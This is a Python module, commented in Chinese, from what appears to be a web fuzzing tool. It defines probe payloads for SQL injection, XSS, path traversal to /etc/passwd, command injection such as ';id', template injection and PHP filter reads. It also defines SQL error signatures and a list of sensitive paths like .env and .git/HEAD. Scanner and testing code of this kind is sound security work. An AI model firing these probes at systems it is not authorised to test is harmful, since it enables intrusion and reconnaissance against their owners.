# -*- coding: utf-8 -*-
"""
内置载荷集与错误特征库。

这些载荷用于**触发并识别**常见 Web 漏洞类别的征兆（不是攻击 PoC）：
fuzz 引擎发送载荷后，结合响应里的错误特征/反射情况判断是否值得人工深入。
"""

from __future__ import annotations

import os

# --- 各类别载荷（短小、用于探测而非利用） ------------------------------- #
SQLI = [
    "'", "\"", "')", "';", "' OR '1'='1", "' OR 1=1-- -", "\" OR \"\"=\"",
    "1' AND SLEEP(0)-- -", "' UNION SELECT NULL-- -", "%27",
]
XSS = [
    "<script>stk(1)</script>", "\"><svg/onload=stk(1)>", "'\"><img src=x onerror=stk(1)>",
    "javascript:stk(1)", "{{7*7}}<stk>",
]
TRAVERSAL = [
    "../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//etc/passwd", "/etc/passwd%00", "..\\..\\..\\windows\\win.ini",
]
CMDI = [
    ";id", "|id", "&&id", "`id`", "$(id)", "; sleep 0", "\n id",
]
SSTI = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "${{7*7}}"]
LFI = ["php://filter/convert.base64-encode/resource=index", "file:///etc/passwd"]
GENERIC = [
    "", " ", "A" * 256, "A" * 4096, "%00", "%0a%0d", "../", "<>\"'`",
    "-1", "0", "2147483648", "9999999999999999999", "NaN", "true", "null",
    "%n%n%n%s%s%s",  # 格式化字符串
]

CATEGORIES: dict[str, list[str]] = {
    "sqli": SQLI,
    "xss": XSS,
    "traversal": TRAVERSAL,
    "cmdi": CMDI,
    "ssti": SSTI,
    "lfi": LFI,
    "generic": GENERIC,
}

# --- 响应错误特征（用于判断 payload 是否"打到了"后端） ------------------ #
SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
    "quoted string not properly terminated", "pg_query()", "psql:", "sqlite3.operationalerror",
    "ora-01756", "odbc sql server driver", "sqlstate", "mysql_fetch", "syntax error at or near",
]

# --- 目录爆破小词表（演示用，生产可用 --wordlist 替换为 SecLists 等） ---- #
COMMON_PATHS = [
    "admin", "login", "api", "api/v1", "config", ".git/HEAD", ".env",
    "backup", "backup.zip", "robots.txt", "sitemap.xml", "test", "debug",
    "phpinfo.php", "server-status", "actuator", "actuator/health", "swagger",
    "swagger-ui.html", "console", "uploads", "static", "wp-login.php",
    ".well-known/security.txt", "health", "metrics", "status",
]


def get_category(name: str) -> list[str]:
    key = name.strip().lower()
    if key == "all":
        merged: list[str] = []
        for vals in CATEGORIES.values():
            merged.extend(vals)
        return merged
    if key not in CATEGORIES:
        raise KeyError(f"未知载荷类别 {name!r}，可选：{', '.join(CATEGORIES)} 或 all")
    return list(CATEGORIES[key])


def load_wordlist(path: str) -> list[str]:
    """从文件加载词表/载荷，每行一项，``#`` 注释，空行忽略。"""
    if not os.path.isfile(path):
        raise FileNotFoundError(f"词表文件不存在：{path}")
    out: list[str] = []
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.rstrip("\n")
            if line and not line.lstrip().startswith("#"):
                out.append(line)
    return out


def has_sql_error(text: str) -> str | None:
    low = text.lower()
    for sig in SQL_ERROR_SIGNATURES:
        if sig in low:
            return sig
    return None
